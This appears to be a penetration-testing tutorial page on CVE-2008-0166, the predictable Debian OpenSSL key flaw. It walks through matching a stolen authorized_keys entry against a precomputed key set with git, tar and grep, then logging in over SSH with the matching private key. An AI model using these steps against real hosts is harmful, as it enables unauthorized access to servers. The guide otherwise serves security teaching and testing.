# Debian OpenSSL Predictable PRNG \(CVE-2008-0166\)

This section is about how to leverage an exfiltrated authorized\_keys file to gain access to the target host.

References:

* [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)
* [https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Vulnerabilities/SSH/key-exploit.md](https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Vulnerabilities/SSH/key-exploit.md)

### Requirements for Exploit

* authorized\_keys file from the target server
* SSH-DSS String from authorized\_keys file

### Steps to Exploit Weakness

1. Get the authorized\_keys file. An example of this file would look like so:

```text
ssh-dss AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf ... (snipped) ... 
```

2. Since this is an ssh-dss key, we need to add that to our local copy of `/etc/ssh/ssh_config`:

```text
PubkeyAcceptedKeyTypes +ssh-dss
```

3. Get [g0tmi1k's debian-ssh repository](https://github.com/g0tmi1k/debian-ssh) and unpack the keys:

```text
git clone https://github.com/g0tmi1k/debian-ssh
tar vjxf debian-ssh/common_keys/debian_ssh_dsa_1024_x86.tar.bz2
```

4. Grep the authorized\_keys file content against the unpacked keys \(the first 20-30 characters should be enough to find the right key\):

```text
grep -lr 'AAAA487rt384ufrgh432087fhy02nv84u7fg839247f' dsa/
```

Note, if there are plus symbols stop at the them as we don't want `grep` to attempt to interpret them as quantifiers \(regexp\). 

IF SUCCESSFUL, the command will return a file, for example:

```text
dsa/1024/84739yufh987fg38fg39847fg38fg3f34f.pub
```

5. We can now use the corresponding private key file to authenticate:

```text
ssh -vvv victim@target -i dsa/1024/84739yufh987fg38fg39847fg38fg3f34f
```

And you should connect without requiring a password. If stuck, the `-vvv` verbosity should provide enough details as to why.

